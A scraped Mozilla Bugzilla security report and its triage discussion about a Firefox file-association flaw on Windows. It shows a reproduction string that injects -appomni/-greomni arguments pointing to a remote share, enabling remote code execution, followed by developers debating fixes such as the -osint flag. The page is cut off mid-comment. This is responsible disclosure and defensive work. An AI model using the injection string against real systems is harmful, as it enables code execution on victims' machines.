        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-user-story-content"
             aria-expanded="false"
             aria-labeledby="module-user-story-title"
             aria-describedby="module-user-story-subtitle"></div>
        <h2 class="module-title" id="module-user-story-title">User Story</h2>
      </div>
    </header>
  <div class="module-content" id="module-user-story-content" style="display:none"
  >
    <pre id="user-story"></pre>
  </div>
</section>







<section class="module" id="module-attachments"
>
    <header id="module-attachments-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Attachments section"
           data-label-collapsed="Expand Attachments section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-attachments-content"
             aria-expanded="true"
             aria-labeledby="module-attachments-title"
             aria-describedby="module-attachments-subtitle"></div>
        <h2 class="module-title" id="module-attachments-title">Attachments</h2>
          <h3 class="module-subtitle" id="module-attachments-subtitle">
            (3 files, 1 obsolete file)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-attachments-content"
  ><table role="table" class="layout-table" id="attachments">
    <tr class=" attach-patch
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=9119189">Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin</a>
        </div>
        <div>
            <a href="#c14" class="attach-time activity-ref"><span class="rel-time" title="2020-01-07 11:29 PST" data-time="1578425349">2 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_550257" ><a class="email " href="/user_profile?user_id=550257" > <span class="fna">Molly Howell (she/her) [:mhowell] (PTO until Nov 1)</span></a>
</div></span>
        </div>
        <div class="attach-info">47 bytes,
          text/x-phabricator-request        </div>
      </td>
      <td>
          <div class="attach-flag"><div class="vcard vcard_75935" ><span class="fn">RyanVM</span>
</div>:
              <a href="#c32"
                  class="flag-name-status rel-time-title activity-ref"
                  title="2 years ago"
              data-time="1578948772"
            >
              approval-mozilla-beta+</a>
          </div>
          <div class="attach-flag"><div class="vcard vcard_580382" ><span class="fn">jcristau</span>
</div>:
              <a href="#c34"
                  class="flag-name-status rel-time-title activity-ref"
                  title="2 years ago"
              data-time="1578948772"
            >
              approval-mozilla-release-</a>
          </div>
          <div class="attach-flag"><div class="vcard vcard_75935" ><span class="fn">RyanVM</span>
</div>:
              <a href="#c35"
                  class="flag-name-status rel-time-title activity-ref"
                  title="2 years ago"
              data-time="1578948772"
            >
              approval-mozilla-esr68+</a>
          </div>
          <div class="attach-flag"><div class="vcard vcard_578488" ><span class="fn">tjr</span>
</div>:
              <a href="#c28"
                  class="flag-name-status rel-time-title activity-ref"
                  title="2 years ago"
              data-time="1578694586"
            >
              sec-approval+</a>
          </div>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=9119189&amp;action=edit">Details</a>&#x0020; |
  <a href="/attachment.cgi?id=9119189">Review</a>
    </tr>
    <tr class="
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=9119318">Simple node WebDAV server that will respond to any folder/file name</a>
        </div>
        <div>
            <a href="#c21" class="attach-time activity-ref"><span class="rel-time" title="2020-01-08 00:15 PST" data-time="1578471326">2 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_600722" ><a class="email " href="/user_profile?user_id=600722" > <span class="fna">Joshua Graham</span></a>
</div></span>
        </div>
        <div class="attach-info">8.03 KB,
          text/plain        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=9119318&amp;action=edit">Details</a>
    </tr>
    <tr class=" attach-obsolete
    " style="display:none">
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=9122670">advisory.txt</a>
        </div>
        <div>
            <a href="#c43" class="attach-time activity-ref"><span class="rel-time" title="2020-01-23 07:54 PST" data-time="1579794874">2 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_578488" ><a class="email " href="/user_profile?user_id=578488" > <span class="fna">Tom Ritter [:tjr] (ni? for response to CVE/sec-approval/advisories/etc)</span></a>
</div></span>
        </div>
        <div class="attach-info">453 bytes,
          text/plain        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=9122670&amp;action=edit">Details</a>
    </tr>
    <tr class="
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=9122901">advisory.txt</a>
        </div>
        <div>
            <a href="#c46" class="attach-time activity-ref"><span class="rel-time" title="2020-01-24 07:03 PST" data-time="1579878194">2 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_578488" ><a class="email " href="/user_profile?user_id=578488" > <span class="fna">Tom Ritter [:tjr] (ni? for response to CVE/sec-approval/advisories/etc)</span></a>
</div></span>
        </div>
        <div class="attach-info">786 bytes,
          text/plain        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=9122901&amp;action=edit">Details</a>
    </tr>
</table>

<footer id="attachments-footer">
  <div id="attachments-actions">
      <button type="button" id="attachments-obsolete-btn" class="secondary">Show Obsolete</button>
  </div>
  
</footer>
  </div>
</section>



<script nonce="G3ksDJFfY9rhVWwEDjA9kwqQEyK5o3pQA9DBUYoXXqSTrd4J">
  init_module_visibility();
</script>



<meta name="firefox-versions" content="{&quot;FIREFOX_AURORA&quot;:&quot;&quot;,&quot;FIREFOX_DEVEDITION&quot;:&quot;94.0b9&quot;,&quot;FIREFOX_ESR&quot;:&quot;78.15.0esr&quot;,&quot;FIREFOX_ESR_NEXT&quot;:&quot;91.2.0esr&quot;,&quot;FIREFOX_NIGHTLY&quot;:&quot;95.0a1&quot;,&quot;FIREFOX_PINEBUILD&quot;:&quot;&quot;,&quot;LAST_MERGE_DATE&quot;:&quot;2021-10-04&quot;,&quot;LAST_RELEASE_DATE&quot;:&quot;2021-10-05&quot;,&quot;LAST_SOFTFREEZE_DATE&quot;:&quot;2021-09-30&quot;,&quot;LATEST_FIREFOX_DEVEL_VERSION&quot;:&quot;94.0b9&quot;,&quot;LATEST_FIREFOX_OLDER_VERSION&quot;:&quot;3.6.28&quot;,&quot;LATEST_FIREFOX_RELEASED_DEVEL_VERSION&quot;:&quot;94.0b9&quot;,&quot;LATEST_FIREFOX_VERSION&quot;:&quot;93.0&quot;,&quot;NEXT_MERGE_DATE&quot;:&quot;2021-11-01&quot;,&quot;NEXT_RELEASE_DATE&quot;:&quot;2021-11-02&quot;,&quot;NEXT_SOFTFREEZE_DATE&quot;:&quot;2021-10-28&quot;}">


<div id="comment-actions">
    <button type="button" id="bottom-btn" class="secondary" aria-label="Go to Page Bottom">Bottom &darr;</button>
  <div class="dropdown">
    <button type="button" id="comment-tags-btn" aria-haspopup="true" aria-label="Tags"
      aria-expanded="false" aria-controls="comment-tags-menu" class="dropdown-button minor">Tags &#9662;</button>
    <ul id="comment-tags-menu" role="menu" tabindex="0" class="dropdown-content left" style="display:none">
      <li role="presentation">
        <a role="menuitem" tabindex="-1" data-comment-tag="">Reset</a>
      </li>
    </ul>
  </div>
  <div class="dropdown">
    <button type="button" id="view-menu-btn" aria-haspopup="true" aria-label="Timeline"
      aria-expanded="false" aria-controls="view-menu" class="dropdown-button minor">Timeline &#9662;</button>
    <ul id="view-menu" role="menu" tabindex="0" class="dropdown-content left" style="display:none">
      <li role="presentation">
        <a id="view-reset" role="menuitem" tabindex="-1">Reset</a>
      </li>
      <li role="separator"></li>
      <li role="presentation">
        <a id="view-collapse-all" role="menuitem" tabindex="-1">Collapse All</a>
      </li>
      <li role="presentation">
        <a id="view-expand-all" role="menuitem" tabindex="-1">Expand All</a>
      </li>
      <li role="presentation">
        <a id="view-comments-only" role="menuitem" tabindex="-1">Comments Only</a>
      </li>
    </ul>
   </div>
</div>
<div class="change-set" id="c0"><div class="comment" data-id="14569874" data-no="0"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-0" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_600722" ><img src="https://secure.gravatar.com/avatar/645309812b791b24a1d272e82e633f19?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_600722" ><a class="email " href="/user_profile?user_id=600722" > <span class="fna">Joshua Graham</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-0"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-0" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#c0">Description</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-01 23:54 PST" data-time="1577951683">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-0">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-0" data-comment-id="14569874" data-ismarkdown="true" ><p>Tested on Microsoft Windows 10 Enterprise version 10.0.17763 Build 17763</p>
<p>Using Firefox version 71.0 (32-bit)</p>
<p>Steps to reproduce (local only):</p>
<ul>
<li>Setup Firefox as Windows&#39; default .pdf handler (right click a pdf file -&gt; open with -&gt; chose other -&gt; select always open with Firefox)</li>
<li>Open the run prompt (windows key + r) and run the following URL:</li>
<li>\\poiu.xss.vg@ssl\a.txt&quot; -appomni appomni.pdf -greomni \share\greomni.pdf</li>
</ul>
<p>Steps to reproduce (via MS Excel):</p>
<ul>
<li>Setup Firefox as Windows&#39; default .pdf handler (right click a pdf file -&gt; open with -&gt; chose other -&gt; select always open with Firefox)</li>
<li>visit <a href="https://poiu.xss.vg/oausdhvjzlxkcn/poc.html" rel="nofollow">https://poiu.xss.vg/oausdhvjzlxkcn/poc.html</a> (this will open a CSV file in excel)</li>
<li>Click the link in the excel document.</li>
<li>Open the greomni.pdf file</li>
</ul>
<p>Expected Result: Firefox ignores the shell activation command as additional command line arguments are present.</p>
<p>Actual Result: Firefox accepts the command and runs using the greomni and appomni files from the internet share.</p>
<p>Detailed Information:</p>
<p>This issue is very similar to <a class="bz_bug_link
          bz_status_VERIFIED bz_closed" href="/show_bug.cgi?id=1530103" title="VERIFIED FIXED - URI handler Remote Code Execution via command line parameter injection in Firefox">bug 1530103</a> and <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=384384" title="RESOLVED FIXED - Multiple Vendor Multiple Browser Interaction URI Handler Command Injection Vulnerability">bug 384384</a> except that it is by file type association as opposed to protocol association.</p>
<p>In Windows, it is possible to inject arbitrary arguments when Firefox is setup as the default file handler for any file type other than .html. This can result in remote code execution when the &#39;greomni&#39; flag is injected.</p>
<p>The attack vector is having a victim activate a URI using the file protocol (file://) or open a file in explorer where the file type&#39;s default handler is Firefox and there are double quotes in the path of the file. One way of fixing this issue is to add the &#39;osint&#39; flag to the following registry key:</p>
<p>HKEY_CLASSES_ROOT\applications\firefox.exe\shell\open\command</p>
<p>i.e. change:</p>
<ul>
<li>&quot;C:\Program Files (x86)\Mozilla Firefox\firefox.exe&quot; &quot;%1&quot;</li>
</ul>
<p>to</p>
<ul>
<li>&quot;C:\Program Files (x86)\Mozilla Firefox\firefox.exe&quot;  -osint &quot;%1&quot;</li>
</ul>
<p>The ‘osint’ flag in the command is supposed to ensure that Firefox ignores any command line arguments that have been injected when Firefox is activated via the Windows registry. The ‘osint’ flag was introduced in 2007 in response to the following bug: <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=384384">https://bugzilla.mozilla.org/show_bug.cgi?id=384384</a></p>
<p>RCE is achieved by introducing malicious code into the contents of files in the omni.ja archive. This is the same as discussed in <a class="bz_bug_link
          bz_status_VERIFIED bz_closed" href="/show_bug.cgi?id=1530103" title="VERIFIED FIXED - URI handler Remote Code Execution via command line parameter injection in Firefox">bug 1530103</a>.</p>
<p>Although it shouldn&#39;t be possible to inject double quotes in a file path in windows as the double quote character is illegal in a file path, Microsoft has confirmed that they won&#39;t be fixing this issue (<a href="https://www.zerodayinitiative.com/advisories/ZDI-19-1023/" rel="nofollow">https://www.zerodayinitiative.com/advisories/ZDI-19-1023/</a>)</p>
<p>Credit:</p>
<p>Joshua Graham of TSS</p>
</div><div class="activity"><div class="change">Flags: sec-bounty?</div></div></div><div class="change-set" id="c1"><div class="comment" data-id="14569998" data-no="1"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-1" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" ><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_159069" ><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-1"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-1" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#c1">Comment 1</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-02 03:30 PST" data-time="1577964631">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-1">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-1" data-comment-id="14569998" data-ismarkdown="true" ><p>Thanks for the report!</p>
<p>(In reply to Joshua Graham from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1606596#c0" title="RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox">comment #0</a>)</p>
<blockquote>
<p>The attack vector is having a victim activate a URI using the file protocol (file://) or open a file in explorer where the file type&#39;s default handler is Firefox and there are double quotes in the path of the file. One way of fixing this issue is to add the &#39;osint&#39; flag to the following registry key:</p>
<p>HKEY_CLASSES_ROOT\applications\firefox.exe\shell\open\command</p>
<p>i.e. change:</p>
<ul>
<li>&quot;C:\Program Files (x86)\Mozilla Firefox\firefox.exe&quot; &quot;%1&quot;</li>
</ul>
<p>to</p>
<ul>
<li>&quot;C:\Program Files (x86)\Mozilla Firefox\firefox.exe&quot;  -osint &quot;%1&quot;</li>
</ul>
<p>The ‘osint’ flag in the command is supposed to ensure that Firefox ignores any command line arguments that have been injected when Firefox is activated via the Windows registry. The ‘osint’ flag was introduced in 2007 in response to the following bug: <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=384384">https://bugzilla.mozilla.org/show_bug.cgi?id=384384</a></p>
<p>RCE is achieved by introducing malicious code into the contents of files in the omni.ja archive. This is the same as discussed in <a class="bz_bug_link
          bz_status_VERIFIED bz_closed" href="/show_bug.cgi?id=1530103" title="VERIFIED FIXED - URI handler Remote Code Execution via command line parameter injection in Firefox">bug 1530103</a>.</p>
</blockquote>
<p>I&#39;m a little puzzled here. This may be a simple oversight, but if it&#39;s more than that I&#39;d like to have it figured out...<br>
I haven&#39;t tried the exploit myself yet, but I&#39;d expect the <code>-osint</code> commandline you describe, without a further <code>-url</code> argument, not to work on Firefox 69+ (and newer versions of ESR), because of the changes in <a class="bz_bug_link
          bz_status_VERIFIED bz_closed" href="/show_bug.cgi?id=1572838" title="VERIFIED FIXED - URI Handler Command Injection Vulnerability [iDefense V-bsk2ottbf1]">bug 1572838</a> (see code at <a href="https://searchfox.org/mozilla-central/source/toolkit/xre/CmdLineAndEnvUtils.h#197" rel="nofollow">https://searchfox.org/mozilla-central/source/toolkit/xre/CmdLineAndEnvUtils.h#197</a> and elsewhere ). That is, <code>firefox.exe -osint path/to/file</code> should, if I&#39;m reading my own code right a few months later, fail to do anything (it&#39;ll exit early). <code>firefox.exe -osint -url file:url-of-some-kind</code> should work, I think. Is that what you meant, or are you also (intentionally or accidentally :-) ) reporting that those checks don&#39;t work the way I think they do?</p>
<p>Molly: assuming the <code>-osint</code> path is the way to go, how hard would it be to update existing installs so the argument is inserted as necessary? I assume fixing new installs &quot;just&quot; means adding things around <a href="https://searchfox.org/mozilla-central/rev/331f0c3b25089c9a16be65f4dc8c601aeaac8cc4/browser/installer/windows/nsis/shared.nsh#521" rel="nofollow">https://searchfox.org/mozilla-central/rev/331f0c3b25089c9a16be65f4dc8c601aeaac8cc4/browser/installer/windows/nsis/shared.nsh#521</a> or thereabouts?</p>
<p>Tentatively moving to the installer component given that that&#39;s where the registration code lives.</p>
</div><div class="activity"><div class="change">Component: Security &rarr; Installer</div><div class="change">Flags: needinfo?(mhowell)</div><div class="change">Flags: needinfo?(jpg.inc.au)</div></div></div><div class="change-set" id="a13086_159069"><div class="change" id="aa13086_159069">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a13086_159069"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_159069" id="a13086_159069"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a13086_159069"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a13086_159069">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#a13086_159069">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-02 03:32 PST" data-time="1577964769">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Type: task &rarr; defect</div><div class="change">See Also:  &rarr; <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Evaluate whether the greomni and appomni command line args can be removed or have restrictions for their paths"
   href="/show_bug.cgi?id=1531475">1531475</a>, <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - URI handler Remote Code Execution via command line parameter injection in Firefox"
   href="/show_bug.cgi?id=1530103">CVE-2019-9794</a></div></div></div><div class="change-set" id="c2"><div class="comment" data-id="14570013" data-no="2"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-2" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_600722" id="a13086_159069"><img src="https://secure.gravatar.com/avatar/645309812b791b24a1d272e82e633f19?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_600722" id="a13086_159069"><a class="email " href="/user_profile?user_id=600722" > <span class="fna">Joshua Graham</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-2"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-2" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#c2">Comment 2</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-02 03:36 PST" data-time="1577964993">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-2">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-2" data-comment-id="14570013" data-ismarkdown="true" ><p>My bad, I double checked and yes it does need -osint -url :-)</p>
</div><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(jpg.inc.au)</span></div></div></div><div class="change-set" id="c3"><div class="comment" data-id="14570409" data-no="3"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-3" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a13086_159069"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_159069" id="a13086_159069"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-3"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-3" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#c3">Comment 3</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-02 07:45 PST" data-time="1577979948">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-3">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-3" data-comment-id="14570409" data-ismarkdown="true" ><p>(In reply to Joshua Graham from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1606596#c2" title="RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox">comment #2</a>)</p>
<blockquote>
<p>My bad, I double checked and yes it does need -osint -url :-)</p>
</blockquote>
<p>Thanks for the quick response. I&#39;m glad I got that right at least...</p>
<p>Leaving this for the installer folks to see if/how to add the <code>-osint</code> thing to the default open command. I also pinged <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1531475" title="RESOLVED FIXED - Evaluate whether the greomni and appomni command line args can be removed or have restrictions for their paths">bug 1531475</a> to see if we can just deprecate these (appomni/greomni) arguments (though that&#39;d likely still leave other issues so we&#39;d need to fix this bug either way).</p>
</div></div><div class="change-set" id="c4"><div class="comment" data-id="14571237" data-no="4"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-4" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_550257" id="a13086_159069"><img src="https://secure.gravatar.com/avatar/3f97cf08c1ecf35bc10896cf363773e5?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_550257" id="a13086_159069"><a class="email " href="/user_profile?user_id=550257" > <span class="fna">Molly Howell (she/her) [:mhowell] (PTO until Nov 1)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-4"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-4" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#c4">Comment 4</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-02 20:29 PST" data-time="1578025793">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-4">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-4" data-comment-id="14571237" data-ismarkdown="true" ><p>[apologies for the slow response to a security bug; the &quot;installer folks&quot; are actually just me, and I&#39;m off and not checking mail much this week]</p>
<p>TL;DR: I don&#39;t think we can fix this in the file association registration code.</p>
<p>The reason why registering a file association in the way that the STR does ends up with a command line that&#39;s missing its <code>-osint</code> is because our installer doesn&#39;t register us as a handler for <code>.pdf</code> when any other handler for it exists (an academic condition on Windows 10, because Edge always exists as a registered PDF handler). That means the Open With dialog fails to find any command string that we&#39;ve created and instead synthesizes a handler with a default command line (one with no arguments). That procedure creates the <code>HKCR\Applications\firefox.exe</code> key for this purpose, so that&#39;s why editing the command in there works.</p>
<p>That all implies that we could fix this by registering as a <code>.pdf</code> handler, but there are two problems with that:</p>
<ol>
<li>We intentionally leave out that handler as a long-standing product decision (reference <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1573267#c3" title="RESOLVED INVALID - Handlers for non-HTML file types only registered when setting default browser">bug 1573267 comment 3</a>).</li>
<li>Worse than that, I don&#39;t see anything that makes this bug specific to PDF files; it seems like opening any local file of a type that&#39;s had an association manually created for it would trigger this, even for types we really don&#39;t support opening. And we can&#39;t have handlers for every possible file extension.</li>
</ol>
<p>If there were a way to override the command line for all file associations registered to the <code>.exe</code> at a certain path, even custom-made associations, then that would work, but I can&#39;t find any such thing (that wouldn&#39;t also affect every process started from that path, which we do not want to do). We can&#39;t use the key at <code>HKCR\Applications\firefox.exe</code> because the File Explorer only looks it up by file name, not by anything unique to the install path.</p>
<p>So unless I&#39;m wrong and there is something PDF-specific here, I&#39;m afraid we end up needing a more general command-line handling fix.</p>
<p>(In reply to :Gijs (he/him) from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1606596#c1" title="RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox">comment #1</a>)</p>
<blockquote>
<p>Molly: assuming the <code>-osint</code> path is the way to go, how hard would it be to update existing installs so the argument is inserted as necessary? I assume fixing new installs &quot;just&quot; means adding things around <a href="https://searchfox.org/mozilla-central/rev/331f0c3b25089c9a16be65f4dc8c601aeaac8cc4/browser/installer/windows/nsis/shared.nsh#521" rel="nofollow">https://searchfox.org/mozilla-central/rev/331f0c3b25089c9a16be65f4dc8c601aeaac8cc4/browser/installer/windows/nsis/shared.nsh#521</a> or thereabouts?</p>
</blockquote>
<p>The command line in that key isn&#39;t used to open files, it&#39;s intended to start the application in a default state (I&#39;m actually not sure it&#39;s used at all nowadays; it&#39;s what the old web browser shortcut that used to be at the top of the start menu would run). The command line that&#39;s used for the file type handlers we register is the one <a href="https://searchfox.org/mozilla-central/rev/053826b10f838f77c27507e5efecc96e34718541/browser/installer/windows/nsis/installer.nsi#439" rel="nofollow">here</a> (set by the installer) and <a href="https://searchfox.org/mozilla-central/rev/053826b10f838f77c27507e5efecc96e34718541/browser/installer/windows/nsis/shared.nsh#846" rel="nofollow">here</a> (set during updates).</p>
</div><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(mhowell)</span></div></div></div><div class="change-set" id="c5"><div class="comment" data-id="14571242" data-no="5"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-5" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_600722" id="a13086_159069"><img src="https://secure.gravatar.com/avatar/645309812b791b24a1d272e82e633f19?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_600722" id="a13086_159069"><a class="email " href="/user_profile?user_id=600722" > <span class="fna">Joshua Graham</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-5"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-5" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#c5">Comment 5</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-02 21:05 PST" data-time="1578027934">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-5">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-5" data-comment-id="14571242" data-ismarkdown="true" ><blockquote>
<p>So unless I&#39;m wrong and there is something PDF-specific here, I&#39;m afraid we end up needing a more general command-line handling fix.</p>
</blockquote>
<p>You are correct, it isn&#39;t PDF specific, any file type association will do it.</p>
<blockquote>
<p>If there were a way to override the command line for all file associations registered to the .exe at a certain path, even custom-made associations, then that would work, but I can&#39;t find any such thing (that wouldn&#39;t also affect every process started from that path, which we do not want to do). We can&#39;t use the key at HKCR\Applications\firefox.exe because the File Explorer only looks it up by file name, not by anything unique to the install path.</p>
</blockquote>
<p>I&#39;m a little confused by the &quot;at a certain path&quot; and &quot;unique to the install path&quot; parts of your comment. Custom made associations are added to <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\&lt;extension&gt;\UserChoice</code> and when you chose Firefox it gets the value <code>Applications\firefox</code> which points it to the <code>HKCR\Applications\firefox.exe</code> key.</p>
<p>Google Chrome was vulnerable to this issue a few months back but it looks like they have patched it (not reported by me). When you set chrome to be the default it&#39;s <code>UserChoice</code> value becomes <code>Applications\chrome.exe</code> which has the value <code>C:\Program Files...\chrome.exe -- %1%</code>. The <code>--</code> is equivalent to <code>-osint -url</code> in Firefox so it must be possible to update that registry key?</p>
</div></div><div class="change-set" id="c6"><div class="comment" data-id="14571820" data-no="6"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-6" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_550257" id="a13086_159069"><img src="https://secure.gravatar.com/avatar/3f97cf08c1ecf35bc10896cf363773e5?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_550257" id="a13086_159069"><a class="email " href="/user_profile?user_id=550257" > <span class="fna">Molly Howell (she/her) [:mhowell] (PTO until Nov 1)</span></a>
</div>
              <span class="user-role">Assignee</span>
